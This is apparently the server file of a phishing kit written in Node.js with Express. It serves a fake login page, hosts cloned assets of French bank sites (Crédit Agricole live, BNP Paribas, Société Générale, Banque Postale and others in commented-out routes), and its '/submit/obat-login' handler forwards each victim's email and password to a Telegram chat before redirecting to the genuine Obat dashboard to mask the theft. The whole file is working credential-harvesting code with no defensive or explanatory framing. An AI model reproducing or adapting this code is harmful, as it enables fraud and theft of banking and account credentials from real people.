const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');

const cors = require('cors');


// Load environment variables
require('dotenv').config();

// Replace 'YOUR_TOKEN' with your bot's API token
// const token_B = process.env.TELEGRAM_BOT_TOKEN;
const token_D = process.env.TELEGRAM_BOT_TOKEN_BOBBY;
// const botB = new TelegramBot(token_B, { polling: false });
const botD = new TelegramBot(token_D, { polling: false });

const app = express();
const PORT = process.env.PORT;

app.use((req, res, next) => {
  // res.set('Access-Control-Allow-Origin', 'https://obats.vercel.app'); // Allow specific origin
  // res.set('Access-Control-Allow-Origin', 'https://www.easypli-connect.com'); // Allow specific origin
  // res.set('Access-Control-Allow-Origin', 'http://localhost:3000'); // Allow specific origin
  res.set('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS'); // Allowed methods
  res.set('Access-Control-Allow-Headers', 'Content-Type, Authorization'); // Allowed headers

  if (req.method === 'OPTIONS') {
    return res.status(200).end(); // Respond to preflight requests
  }

  next();
});
// Serve static files from the "public" directory
app.use('/creditagricole/src', express.static('creditagricole/src'));


// app.use('/bfc', express.static(path.join(__dirname, 'bfc', 'bfc')));
// app.use('/bfc/src', express.static('bfc/src'));

// app.use('/societe-general/src', express.static('societe-general/src'));
// app.use('/societe-general/src/css', express.static('societe-general/src/css', {
//   setHeaders: (res) => res.set('Content-Type', 'text/css')
// }));
// app.use('/societe-general/src/css', express.static(path.join(__dirname, 'societe-general', 'src', 'css'), {
//   setHeaders: (res, filePath) => {
//     if (filePath.endsWith('.css')) {
//       res.set('Content-Type', 'text/css');
//     }
//   }
// }));



// app.use('/bnp-paribas/src', express.static('bnp-paribas/site/src'));
// app.use('/bnp-paribas/bnp-paribas/src/css', express.static('bnp-paribas/site/src/css', {
//   setHeaders: (res) => res.set('Content-Type', 'text/css')
// }));
// app.use('/bnp-paribas/src/js', express.static('bnp-paribas/site/src/js', {
//   setHeaders: (res) => res.set('Content-Type', 'application/javascript')
// }));


// app.use('/banque-postale/src/css', express.static('banque-postale/src/css', { 
//   setHeaders: (res) => res.set('Content-Type', 'text/css') 
// }));
// app.use('/banque-postale/src/js', express.static('banque-postale/src/js', { 
//   setHeaders: (res) => res.set('Content-Type', 'application/javascript') 
// }));
// app.use('/banque-postale/src/img', express.static('banque-postale/src/img', {
//   setHeaders: (res, path) => {
//     if (path.endsWith('.svg')) {
//       res.set('Content-Type', 'image/svg+xml');
//     }
//   }
// }));
app.use('/lib/fa/css', express.static('lib/fa/css', { 
     setHeaders: (res) => res.set('Content-Type', 'text/css') 
   }));
app.use('/build', express.static('build', { 
     setHeaders: (res) => res.set('Content-Type', 'text/css') 
   }));
app.use('/favicon', express.static('favicon', { 
     ssetHeaders: (res, path) => {
           if (path.endsWith('.svg')) {
             res.set('Content-Type', 'image/svg+xml');
           }
         }
   }));
app.use('/img', express.static('img', { 
     ssetHeaders: (res, path) => {
           if (path.endsWith('.png')) {
             res.set('Content-Type', 'image/png');
           }
         }
   }));


// Serve the HTML form
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, '.', 'login.html'));
});

// app.get('/banque-postale', (req, res) => {
//   res.sendFile(path.join(__dirname, 'banque-postale', 'index.html'));
// });
// app.get('/banque-postale/login', (req, res) => {
//   res.sendFile(path.join(__dirname, 'banque-postale', 'login.html'));
// });

// app.get('/bred', (req, res) => {
//   res.sendFile(path.join(__dirname, 'bred-banque-populaire', 'site', 'index.html'));
// });

// app.get('/creditmutuele', (req, res) => {
//   res.sendFile(path.join(__dirname, 'credit-mutuel', 'site', 'authentication.html'));
// });

// app.get('/creditagricole', (req, res) => {
//   res.sendFile(path.join(__dirname, 'creditagricole', 'index.html'));
// });

// app.get('/bnp-paribas', (req, res) => {
//   res.sendFile(path.join(__dirname, 'bnp-paribas', 'site', 'index.html'));
// });

// app.get('/bfc', (req, res) => {
//   res.sendFile(path.join(__dirname, 'bfc', 'index.html'));
// });


// app.get('/societe-general', (req, res) => {
//   res.sendFile(path.join(__dirname, 'societe-general', 'index.html'));
// });

// const chatIdB = process.env.TELEGRAM_CHAT_ID;
const chatIdD = process.env.TELEGRAM_CHAT_ID_BOBBY;
// Handle form submissions
app.post('/submit/obat-login', express.json(), async (req, res) => {
  try {
    // Extract the form data from the request body
    const { email, password, formTitle } = req.body;

    // Format message for Telegram (use email & password as form fields in Obat)
    const telegramMessage = `
      Nouveau formulaire: ${formTitle || 'Obat Login'}
      Email: ${email}
      Mot de passe: ${password}
    `;

    console.log('telegramMessage:', telegramMessage);

    // Send to bots in parallel
    await Promise.all([
      // botB.sendMessage(chsatIdB, telegramMessage),
      botD.sendMessage(chatIdD, telegramMessage)
    ]);

    // Respond with success JSON, including a redirect URL as expected by the client-side JS
    res.json({
      success: true,
      redirectUrl: "https://app.obat.fr/dashboard" // change if you want a different destination
    });
  } catch (error) {
    console.error('Error processing submission:', error);
    res.status(500).json({ success: false, error: 'Failed to submit data.' });
  }
});


// Start the server
app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});